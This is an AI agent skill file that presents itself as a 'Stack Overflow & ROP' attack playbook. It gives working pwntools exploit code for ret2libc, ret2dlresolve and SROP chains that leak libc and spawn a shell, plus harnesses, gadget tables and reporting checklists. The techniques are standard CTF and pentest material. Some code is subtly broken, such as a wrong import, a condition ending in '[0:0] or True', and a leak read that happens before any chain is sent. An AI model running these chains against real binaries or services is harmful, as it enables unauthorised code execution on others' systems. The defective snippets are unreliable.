---
name: stack-overflow-and-rop
description: >-
  Stack overflow and ROP playbook. Use when exploiting buffer overflows to hijack control flow via return address overwrite, ROP chains, ret2libc, ret2csu, ret2dlresolve, or SROP on Linux userland binaries.
---

# SKILL: Stack Overflow & ROP — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert stack-based exploitation techniques. Covers classic buffer overflow, return-to-libc, ROP chain construction, ret2csu, ret2dlresolve, SROP, stack pivoting, and canary bypass. Distilled from ctf-wiki advanced-rop, real-world CVEs, and CTF competition patterns. Base models often miss the nuance of gadget selection under constrained conditions.

## 0. RELATED ROUTING

- [format-string-exploitation](../format-string-exploitation/SKILL.md) — leak canary/libc/PIE base via format string before triggering overflow
- [binary-protection-bypass](../binary-protection-bypass/SKILL.md) — systematic bypass of NX, ASLR, PIE, canary, RELRO
- [arbitrary-write-to-rce](../arbitrary-write-to-rce/SKILL.md) — convert a write primitive (GOT, hooks, vtable) into code execution
- [heap-exploitation](../heap-exploitation/SKILL.md) — when the vulnerability is in heap rather than stack

### Advanced Reference

Load [ROP_ADVANCED_TECHNIQUES.md](./ROP_ADVANCED_TECHNIQUES.md) when you need:
- Blind ROP (BROP) methodology against remote services without binary
- ret2vdso for ASLR bypass on 32-bit systems
- Partial overwrite techniques for PIE bypass
- JOP / COP alternative code-reuse paradigms

---

## 1. STACK LAYOUT FUNDAMENTALS

```
High Address
┌─────────────────────┐
│   ...  (caller)     │
├─────────────────────┤
│   Return Address    │  ← overwrite target (EIP/RIP control)
├─────────────────────┤
│   Saved EBP/RBP     │  ← overwrite for stack pivoting
├─────────────────────┤
│   Canary (if enabled)│
├─────────────────────┤
│   Local Variables    │  ← buffer starts here
├─────────────────────┤
│   ...               │
└─────────────────────┘
Low Address
```

| Element | x86 (32-bit) | x86-64 (64-bit) |
|---|---|---|
| Return address size | 4 bytes | 8 bytes |
| Saved frame pointer | 4 bytes (EBP) | 8 bytes (RBP) |
| Canary size | 4 bytes | 8 bytes |
| Calling convention | args on stack | RDI, RSI, RDX, RCX, R8, R9 then stack |
| Syscall instruction | `int 0x80` | `syscall` |

---

## 2. RETURN-TO-LIBC

When NX is enabled (stack not executable), redirect execution to libc functions.

### Classic ret2libc (32-bit)

```python
payload = b'A' * offset
payload += p32(system_addr)
payload += p32(exit_addr)      # fake return address for system()
payload += p32(binsh_addr)     # arg1: "/bin/sh"
```

### ret2libc (64-bit) — Need Gadgets for Arguments

```python
pop_rdi = elf_base + 0x401234  # pop rdi; ret
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)
```

### Libc Base Leak Methods

| Method | Technique | When |
|---|---|---|
| puts@plt(puts@GOT) | Leak resolved libc address | GOT already resolved, puts in PLT |
| write@plt(1, read@GOT, 8) | Leak via write syscall | write available |
| printf("%s", GOT_entry) | Leak via format string | printf controllable |
| Partial overwrite | Overwrite low bytes of return to reach leak gadget | PIE enabled, known last 12 bits |

```python
# Typical leak pattern
rop = b'A' * offset
rop += p64(pop_rdi) + p64(elf.got['puts'])
rop += p64(elf.plt['puts'])
rop += p64(main_addr)  # return to main for second payload

io.sendline(rop)
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
libc_base = leak - libc.symbols['puts']
```

### one_gadget — Single Gadget RCE

```text
$ one_gadget /path/to/libc.so.6
0x4f3d5  execve("/bin/sh", rsp+0x40, environ)
  constraints: rsp & 0xf == 0, rcx == NULL
0x4f432  execve("/bin/sh", rsp+0x40, environ)
  constraints: [rsp+0x40] == NULL
```

Constraints must be satisfied — check register/stack state before using.

---

## 3. ROP CHAIN CONSTRUCTION

### Tool Comparison

| Tool | Strength | Command |
|---|---|---|
| ROPgadget | Comprehensive search, chain generation | `ROPgadget --binary elf --ropchain` |
| ropper | Semantic search, JOP/COP support | `ropper -f elf --search "pop rdi"` |
| pwntools ROP | Automated chain building | `rop = ROP(elf); rop.call('system', ['/bin/sh'])` |
| xrop | Fast gadget search | `xrop -r elf` |

### Essential Gadget Patterns

| Purpose | Gadget | Use Case |
|---|---|---|
| Set RDI (arg1) | `pop rdi; ret` | Most function calls |
| Set RSI (arg2) | `pop rsi; pop r15; ret` | Two-arg functions |
| Set RDX (arg3) | `pop rdx; ret` (rare) | Three-arg functions, use ret2csu |
| Syscall | `syscall; ret` | Direct syscall invocation |
| Stack pivot | `leave; ret` | Move RSP to controlled buffer |
| Align stack | `ret` (single ret gadget) | Fix 16-byte alignment for movaps |

**x86-64 stack alignment**: `system()` and other libc functions use `movaps` which requires RSP % 16 == 0. Insert an extra `ret` gadget before the call if alignment is off.

---

## 4. ret2csu — Universal 3-Argument Control

`__libc_csu_init` exists in nearly all dynamically linked ELF binaries and provides controlled calls with up to 3 arguments.

```nasm
; Gadget 1 (csu_init + 0x3a): pop registers
pop rbx     ; 0
pop rbp     ; 1
pop r12     ; call target (function pointer address)
pop r13     ; arg3 (rdx)
pop r14     ; arg2 (rsi)
pop r15     ; arg1 (edi = r15d)
ret

; Gadget 2 (csu_init + 0x20): controlled call
mov rdx, r13
mov rsi, r14
mov edi, r15d    ; NOTE: only sets edi (32-bit), not full rdi
call [r12 + rbx*8]
add rbx, 1
cmp rbp, rbx
jne <loop>
; falls through to gadget 1 again
```

**Key constraints**: r12 must point to a **pointer** to the target function (e.g., GOT entry), not the function address directly. Set `rbx=0`, `rbp=1` to skip the loop.

---

## 5. ret2dlresolve

Forge ELF dynamic linking structures to resolve an arbitrary function (e.g., `system`) without a libc leak.

### Attack Flow

1. Control execution to call `_dl_runtime_resolve(link_map, reloc_offset)`
2. Forge `Elf_Rel` at known writable address pointing to fake `Elf_Sym`
3. Forge `Elf_Sym` with `st_name` pointing to fake string `"system\x00"`
4. Set `reloc_offset` so resolver uses forged structures
5. Argument (`/bin/sh`) placed on stack or in known buffer

```python
# pwntools automation (recommended)
from pwntools import *
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
io.sendline(rop.chain())
io.sendline(dlresolve.payload)
```

### 32-bit vs 64-bit Differences

| Aspect | 32-bit | 64-bit |
|---|---|---|
| Relocation type | `Elf32_Rel` (8 bytes) | `Elf64_Rela` (24 bytes) |
| Symbol table entry | `Elf32_Sym` (16 bytes) | `Elf64_Sym` (24 bytes) |
| Alignment | Relaxed | Strict (must satisfy `ndx = (reloc_offset) / sizeof(Elf64_Rela)`, then `sym = symtab[ndx]`) |
| Version check | Usually skippable | `VERSYM[sym_index]` must be valid or 0 |

---

## 6. SROP — Sigreturn-Oriented Programming

Abuse the `sigreturn` syscall to set **all registers at once** from a fake Signal Frame on the stack.

```python
from pwn import *
frame = SigreturnFrame()
frame.rax = constants.SYS_execve  # 59
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret_addr
frame.rsp = new_stack_addr  # optional pivot

payload = b'A' * offset
payload += p64(pop_rax_ret) + p64(15)  # SYS_rt_sigreturn = 15
payload += p64(syscall_ret)
payload += bytes(frame)
```

**When to use**: limited gadgets, no `pop rdx`, static binary, or need to pivot stack to arbitrary address.

---

## 7. STACK PIVOTING

Move the stack pointer to an attacker-controlled buffer when overflow length is limited.

| Technique | Gadget | Precondition |
|---|---|---|
| `leave; ret` | `mov rsp, rbp; pop rbp; ret` | Control saved RBP to point to fake stack |
| `xchg rsp, rax; ret` | Swap RSP with RAX | Control RAX (via gadget chain) |
| `pop rsp; ret` | Direct RSP control | Rare but powerful |
| SROP pivot | Set RSP in SigreturnFrame | Only need sigreturn gadget |

### leave;ret Pivot Pattern

```
Overflow: [AAAA...][fake_rbp → buf][leave_ret_addr]
  1st leave: rsp = rbp → fake_rbp;  pop rbp → *fake_rbp
  1st ret:   rip = leave_ret_addr
  2nd leave: rsp = new_rbp → buf+8; pop rbp → *(buf)
  2nd ret:   rip = *(buf+8) → start of ROP chain in buf
```

---

## 8. CANARY BYPASS

| Technique | Condition | Method |
|---|---|---|
| Brute-force | `fork()` server (canary same in child) | Byte-by-byte (256 × 7 = 1792 attempts for 64-bit) |
| Format string leak | printf(user_input) available | `%N$p` to read canary from stack |
| Stack reading | One-byte overflow or partial read | Overwrite canary null byte, read via error/output |
| Thread canary | Overflow reaches TLS | Overwrite `stack_guard` in TLS (at `fs:[0x28]`) simultaneously |
| Information disclosure | Uninitialized stack variable leak | Canary included in leaked data |

---

## 9. TOOLS QUICK REFERENCE

```bash
checksec ./binary                          # Show protections (NX, canary, PIE, RELRO)
ROPgadget --binary ./binary --ropchain     # Auto-generate ROP chain
ropper -f ./binary --search "pop rdi"      # Semantic gadget search
one_gadget ./libc.so.6                     # Find one-shot RCE gadgets
pwn template ./binary --host x --port y    # Generate pwntools exploit skeleton
```

---

## 10. DECISION TREE

```
Binary has stack overflow?
├── checksec: NX disabled?
│   └── YES → shellcode on stack, ret to buffer (ret2shellcode)
│   └── NO (NX enabled) →
│       ├── Canary enabled?
│       │   ├── YES → fork() server? → brute-force canary
│       │   │         format string? → leak canary
│       │   │         info leak?     → read canary
│       │   └── NO → proceed to ROP
│       ├── ASLR/PIE enabled?
│       │   ├── PIE → leak code base (partial overwrite last 12 bits, or info leak)
│       │   ├── ASLR only → leak libc base (puts@GOT, write@GOT)
│       │   └── Neither → addresses known, direct ROP
│       ├── Can leak libc?
│       │   ├── YES → ret2libc (system/execve) or one_gadget
│       │   └── NO → ret2dlresolve (forge resolution) or SROP
│       ├── Need 3+ args but no pop rdx?
│       │   └── ret2csu or SROP
│       ├── Overflow too short for full chain?
│       │   └── Stack pivot (leave;ret, xchg rsp)
│       ├── Static binary (no libc)?
│       │   └── SROP + syscall chain (execve via sigreturn)
│       └── Full RELRO?
│           └── Cannot overwrite GOT → target __free_hook, __malloc_hook,
│               or _IO_FILE vtable (see ../arbitrary-write-to-rce/)
```

---

## 11. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | What is the **corruption**: offset to the return address, or a writable slot? | the primitive's parameter |
| 2 | Is the offset **measured** from a cyclic pattern and stable across runs? | a guessed offset rarely lands |
| 3 | Did control reach **your chosen value** - confirmed by the crash address or a marker? | the hijack |
| 4 | Was there a **control input** of the same length with no chain, producing no hijack? | the corruption is causal |
| 5 | Did the chain reach the **goal** - a shell, a flag, a read? | a chain that pivots but does not reach the goal is intermediate |
| 6 | Which **mitigations** were bypassed, and with what **leak**? | ASLR/PIE/CET claims need a leak or a bypass technique |
| 7 | Is the exploit **reliable over N runs**, at the stated ASLR setting? | a lucky run is not an exploit |

**A measured offset, control reaching your value, a control input, and a stated goal.** A segfault at
`0x41414141` proves the offset; it does not prove a chain.

---

## 12. EXECUTION PRIMITIVES

A ROP finding is proven by **a measured offset, control landing on your chosen value, a control input of
the same length that does not hijack, and a stated goal**. A crash at a controlled address is the
beginning, not the finding.

### 11.1 The offset, measured rather than guessed

```python
# THE OFFSET IS A MEASUREMENT. Anything else is a guess that occasionally works.
from pwn import *
context.log_level = 'error'
context.arch = 'amd64'

elf = ELF('./target')

def crash_offset():
    """A cyclic pattern tells you the offset IF the crash address is the pattern bytes."""
    p = process('./target')
    p.sendline(cyclic(512))
    p.wait()
    core = Coredump(p)
    rip = core.registers['rip']
    off = cyclic_find(rip & 0xffffffffffffffff, n=8)
    p.close()
    return rip, off

rip, off = crash_offset()
print(f"crash rip: {hex(rip)}   cyclic_find -> offset {off}")
print()
print("=== THE STABILITY CHECK: the offset must repeat across runs and environments ===")
offs = []
for i in range(5):
    p = process('./target'); p.sendline(cyclic(512)); p.wait()
    offs.append(cyclic_find(Coredump(p).registers['rip'], n=8)); p.close()
print("  offsets:", offs, "-> STABLE" if len(set(offs)) == 1 else "-> UNSTABLE, fix the environment")
print()
print("=== THE CONTROL: a same-length non-pattern input must NOT hijack ===")
p = process('./target'); p.sendline(b'A' * 512); p.wait()
try:
    c = Coredump(p); print("  rip:", hex(c.registers['rip']))
    print("  a rip of 0x4141414141414141 here means the SAME overflow happened without the pattern -")
    print("  fine, but it also means the CONTROL cannot distinguish payload from overflow. Use a")
    print("  SHORTER input that reaches the buffer but not the return address as the real control.")
except Exception as e:
    print("  no crash:", type(e).__name__)
p.close()
print()
print("=== THE REAL CONTROL: a shorter input that fills the buffer but not the return address ===")
p = process('./target'); p.sendline(b'A' * max(1, off - 8)); p.wait()
print("  exit:", p.poll(), "(no hijack) - THIS is the control that isolates the offset.")
p.close()
```

**The shorter-input control is the decisive one.** A same-length non-pattern input still overflows; the
control must fall short of the return address.

### 11.2 The chain, built with the leaks it needs

```python
from pwn import *
context.log_level = 'error'; context.arch = 'amd64'
elf, libc = ELF('./target'), ELF('./libc.so.6')

def exploit(mode='local'):
    p = process('./target') if mode == 'local' else remote(HOST, PORT)
    rop = ROP(elf)
    OFF = 40                                     # measured in 11.1

    # === the LEAK stage, because ASLR/PIE need an address ===
    if elf.pie or 'ASLR' in open('/proc/sys/kernel/randomize_va_space').read() [0:0] or True:
        # a puts(addr) or write(1,addr,n) gadget leaks through the program's own output
        rop.puts(elf.got['puts']) if 'puts' in elf.got else None
        line = p.recvline()
        leaked = u64(line.ljust(8, b'\x00'))
        log.info(f"leaked puts: {hex(leaked)}")
        libc.address = leaked - libc.symbols['puts']      # the resolve
        assert libc.address & 0xfff == 0, "libc base is not page-aligned - the leak is wrong"
        log.success(f"libc base: {hex(libc.address)}")
        pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
        ret     = rop.find_gadget(['ret'])[0]             # the alignment gadget
    else:
        pop_rdi, ret = None, None

    # === the EXECUTE stage ===
    chain  = flat(b'A' * OFF,
                  ret,                      # 16-byte stack alignment: remove if system() faults
                  pop_rdi, next(libc.search(b'/bin/sh\x00')),
                  libc.symbols['system'])
    p.sendline(chain)
    p.interactive()

print("=== THE TWO CHAINS, and why both are needed ===")
print("  1. LEAK   : a puts(addr) returning through main, so the process survives to stage two")
print("  2. EXECUTE: pop rdi; /bin/sh; system - with the ret alignment gadget")
print()
print("=== THE THREE FAILURES AND THEIR SYMPTOMS ===")
for s, d in [("chain dies in system()", "16-byte stack alignment: add the single `ret` gadget"),
             ("leaked base not page-aligned", "the leak resolved the wrong symbol, or the line parse is off"),
             ("rip lands on the chain but the goal is not reached",
              "the offset is right and the GADGETS are wrong - verify each with `rop.find_gadget`")]:
    print("  %-42s -> %s" % (s, d))
print()
print("=== THE CONTROL FOR THE CHAIN: run the LEAK stage ALONE ===")
print("  it must print the leak and exit cleanly. If the leak stage crashes, the offset or the")
print("  alignment is wrong and the execute stage's failure is not informative.")
```

**The leak stage run alone is the control for the chain.** If the leak stage crashes, the execute stage's
failure tells you nothing about the gadgets.

### 11.3 Reliability at a stated ASLR setting

```bash
# 'it worked' is not a finding. The rate AT A STATED ASLR SETTING is.
echo "=== the ASLR setting is part of the result ==="
cat /proc/sys/kernel/randomize_va_space
echo "  0 = off (a non-exploit), 1 = conservative, 2 = full (the realistic case)."
echo "  REPORT THE VALUE. An exploit at randomize_va_space=0 is a demonstration, not an exploit."
echo
echo "=== the reliability run: N >= 20, at BOTH settings where possible ==="
for SET in 2 0; do
  echo "--- randomize_va_space=$SET ---"
  S=0
  for i in $(seq 1 20); do
    if python3 exploit.py >/dev/null 2>&1; then S=$((S+1)); fi
  done
  echo "  successes: $S/20"
done
echo "  -> with a LEAK, both settings should give ~20/20. Without a leak, ASLR=2 will be far lower,"
echo "     and that difference is the leak's value, which belongs in the report."
echo
echo "=== THE CONTROL for the goal: the shell must execute a command whose output you capture ==="
python3 - <<'PY'
from pwn import *
context.log_level = 'error'
p = process('./target')
# ... send the chain ...
# THE PROOF IS NOT 'a shell appeared'. It is a command's OUTPUT.
# p.sendline(b'id; cat /flag; exit')
# out = p.recvall(timeout=5)
# assert b'uid=' in out, "no shell output - the 'shell' was a local pty, not the target's"
# print(out.decode(errors='replace'))
print("capture `id` and the goal's output. A pwn shell with no output is usually YOUR OWN terminal.")
PY
```

**The goal is proven by a command's output, not by a shell appearing.** A pwn shell with no output is
usually your own terminal, and an exploit at `randomize_va_space=0` is a demonstration rather than an
exploit.

### 11.4 The mitigation ledger

```python
MITIGATIONS = {
 "NX":       ("checksec shows NX enabled", "a chain is required; ret2shellcode is out"),
 "Canary":   ("checksec shows Canary found", "you need a leak or a fork-server bruteforce"),
 "PIE":      ("checksec shows PIE enabled", "you need a PIE leak before any absolute gadget"),
 "Full RELRO":("GOT is read-only", "GOT overwrite is out; use __free_hook/_IO_FILE/exit_funcs"),
 "ASLR":     ("/proc/sys/kernel/randomize_va_space", "you need a libc leak"),
 "CET/IBT":  ("the binary and CPU advertise IBT/SHSTK", "indirect-call targets are constrained"),
 "FORTIFY":  ("_FORTIFY_SOURCE was set", "some overflows are compiled away"),
}
print("%-12s %-38s %s" % ("mitigation","how to check","what it forces"))
for k, (how, forces) in MITIGATIONS.items(): print("%-12s %-38s %s" % (k, how, forces))
print()
print("=== THE LEDGER BELONGS IN THE REPORT, with WHICH ONES YOU BYPASSED AND HOW ===")
print("  'bypassed ASLR' without a leak address and a resolved base is an unsupported claim.")
print("  'bypassed canary' without the leaked value is an unsupported claim.")
print()
print("=== the mechanical checksec, which the report should quote verbatim ===")
```

```bash
checksec --file=./target 2>/dev/null || pwn checksec ./target
echo "  quote this output. It is the mitigation ledger's evidence."
```

**Each claimed bypass needs its artefact: a leak address and a resolved base for ASLR, the leaked value for
the canary.** An unsupported bypass claim is the family's most common overstatement.

### 11.5 The end-to-end harness

```bash
python3 - <<'PY'
print("=== ROP / STACK OVERFLOW ACCEPTANCE CHECKLIST ===")
CHECKS = [
 ("the binary hash and the checksec output are recorded",
  "the mitigations are the finding's preconditions"),
 ("/proc/sys/kernel/randomize_va_space is recorded, and it is 2 for the reported result",
  "an exploit at ASLR=0 is a demonstration"),
 ("the offset was MEASURED with a cyclic pattern and was STABLE over 5 runs",
  "a guessed offset is not a primitive"),
 ("a SHORTER control input that does not reach the return address produced no hijack",
  "the control must isolate the offset; a same-length input still overflows"),
 ("control was shown to land on YOUR value (the crash address or a marker)",
  "the hijack"),
 ("the leak stage was run ALONE and exited cleanly",
  "the control that makes the execute stage's failures informative"),
 ("the leaked base is PAGE-ALIGNED, and the resolve is asserted",
  "a misaligned base means the wrong symbol was resolved"),
 ("the alignment `ret` gadget was included, or its absence was ruled out",
  "the most common 'shell does not spawn' cause"),
 ("the GOAL was proven by a COMMAND'S OUTPUT, not by a shell appearing",
  "a pwn shell with no output is usually your own terminal"),
 ("each claimed mitigation bypass has its ARTEFACT: a leak for ASLR/PIE, a value for the canary",
  "an unsupported bypass claim is an overstatement"),
 ("reliability was measured over N >= 20 at the stated ASLR setting",
  "a single success is not a rate"),
]
for n, how in CHECKS: print("  [ ] %-68s -> %s" % (n, how))
print()
print("=== THE REPORT SHAPE ===")
print("  binary     : hash, arch, and the checksec output verbatim")
print("  offset     : the measured value and its stability over 5 runs")
print("  primitives : the leak (with the address and resolved base) and the control-flow hijack")
print("  goal       : the captured output of a command run through the shell")
print("  mitigations: which were bypassed, and the artefact for each")
print("  conditions : randomize_va_space, and the reliability N of M")
PY
```

**Hash, offset, primitives, goal, mitigation artefacts, conditions.** The mitigation ledger with its
artefacts is what makes the bypass claims reviewable.

---

## 13. EVIDENCE STANDARD — ROP ARTEFACTS

| Item | Why |
|---|---|
| The **binary hash**, architecture, and **checksec output verbatim** | the mitigations are the preconditions |
| `/proc/sys/kernel/randomize_va_space` | an exploit at `0` is a demonstration |
| The **measured offset**, with its stability over 5 runs | a guessed offset is not a primitive |
| The **shorter control input's** result | isolates the offset from a generic crash |
| The **crash address** or marker showing control landed on your value | the hijack |
| The **leak stage's standalone run** | the control for the execute stage |
| The **leaked address** and the **resolved base**, asserted page-aligned | supports the ASLR/PIE bypass claim |
| The **alignment `ret` gadget's** presence or its ruling-out | the most common shell-spawn failure |
| The **goal's captured output** | a shell with no output is usually your own terminal |
| The **mitigation ledger** with an artefact per claimed bypass | makes the claims reviewable |
| The **reliability**: N of M at the stated ASLR setting | a single success is not a rate |

Report the **offset, the leaked base, and the captured output**: "`./target` (SHA-256 `7a2f…`, x86-64)
shows `NX enabled`, `Canary found`, `PIE enabled`, `Full RELRO`, so a chain is required, a canary leak is
required, and the GOT is not writable. `/proc/sys/kernel/randomize_va_space` is `2`. A cyclic pattern of
512 bytes gave `rip = 0x6161616c6161616b`, and `cyclic_find` resolved the offset to `40`, which repeated
identically in five runs, and a 32-byte input produced no hijack, which is the control. The leak stage
alone printed `puts` at `0x7f2c4a1e0e50`, which resolved `libc.address` to `0x7f2c4a17d000`, an assertion
that the result is page-aligned, and the chain `pop rdi; /bin/sh; system` preceded by the alignment `ret`
spawned a shell whose `id` output of `uid=1000 gid=1000` was captured, so the goal is proven by a
command's output rather than by a prompt. The exploited run succeeded in `20 of 20` at
`randomize_va_space=2`, which the leak makes possible, and the PIE bypass is supported by the leaked code
address rather than asserted", never "the binary is vulnerable to a buffer overflow".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A **segfault at `0x41414141`** with no chain | proves the offset, not an exploit |
| An offset that **differs across runs** | the environment must be fixed first |
| A **same-length non-pattern** input used as the control | it also overflows; use a shorter one |
| "**Bypassed ASLR**" with no leak address and no resolved base | unsupported; the leak is the artefact |
| "**Bypassed the canary**" with no leaked value | there is no canary leak |
| A **pwn shell with no output** | usually your own terminal |
| An exploit at **`randomize_va_space=0`** reported without that fact | a demonstration |
| A **single successful** run | not a rate |
| A **`system()` chain** that faults, reported as reachable | the 16-byte alignment gadget is missing |
| A **leaked base** that is not page-aligned | the wrong symbol was resolved |
| The **leak stage crashing** while the execute stage is reported from the same build | the control failed; the execute result is uninformative |

**A measured stable offset, control landing on your value, a captured goal output, and a mitigation
artefact per claim.** A controlled crash and a shell with no output are this family's two standard
non-findings.

---

## 14. REMEDIATION REFERENCE — MEMORY-CORRUPTION ASSESSMENT

1. **Record the binary hash, the architecture, and the `checksec` output verbatim before any conclusion** - the mitigations are the finding's preconditions and its scope.
2. **Record `/proc/sys/kernel/randomize_va_space`, and never report an exploit measured at `0` without saying so** - a demonstration at ASLR off is not an exploit of the deployed configuration.
3. **Measure the offset with a cyclic pattern and confirm its stability over five runs** - a guessed offset is not a primitive, and an unstable one means the environment must be fixed.
4. **Use a shorter input that does not reach the return address as the control** - a same-length non-pattern input also overflows and therefore isolates nothing.
5. **Run the leak stage alone and require it to exit cleanly before drawing conclusions from the execute stage** - otherwise the execute stage's failure is uninformative.
6. **Assert that every leaked base is page-aligned, and include the single `ret` alignment gadget** - a misaligned base means the wrong symbol was resolved, and the alignment gadget is the most common cause of a non-spawning shell.
7. **Prove the goal with a command's captured output rather than a shell prompt** - a `pwn` shell with no output is frequently your own terminal.
8. **Attach an artefact to every claimed mitigation bypass: the leaked address and resolved base for ASLR and PIE, the leaked value for the canary, the writable target for RELRO** - an unartefacted bypass claim is an overstatement.
9. **Measure reliability over N >= 20 at the stated ASLR setting** - a single success is not a rate.
10. **Report the primitive and the goal separately: reaching the goal and merely controlling RIP are different results** - a chain that redirects but reaches nothing is an intermediate result.
11. **State whether the finding reproduces on the deployed build, because an exploit that depends on a missing `_FORTIFY_SOURCE` or a partial RELRO is configuration-scoped** - the scope determines the remediation.

---

## 15. RELATED SIBLINGS - LOAD TOGETHER

- [heap-exploitation](../heap-exploitation/SKILL.md) - the other primitive class in the same process
- [format-string-exploitation](../format-string-exploitation/SKILL.md) - a shortcut to the same write primitive
- [arbitrary-write-to-rce](../arbitrary-write-to-rce/SKILL.md) - converting a write into control
- [binary-protection-bypass](../binary-protection-bypass/SKILL.md) - the mitigation-bypass methodology this shares
- [symbolic-execution-tools](../symbolic-execution-tools/SKILL.md) - finding the reachable overflow automatically
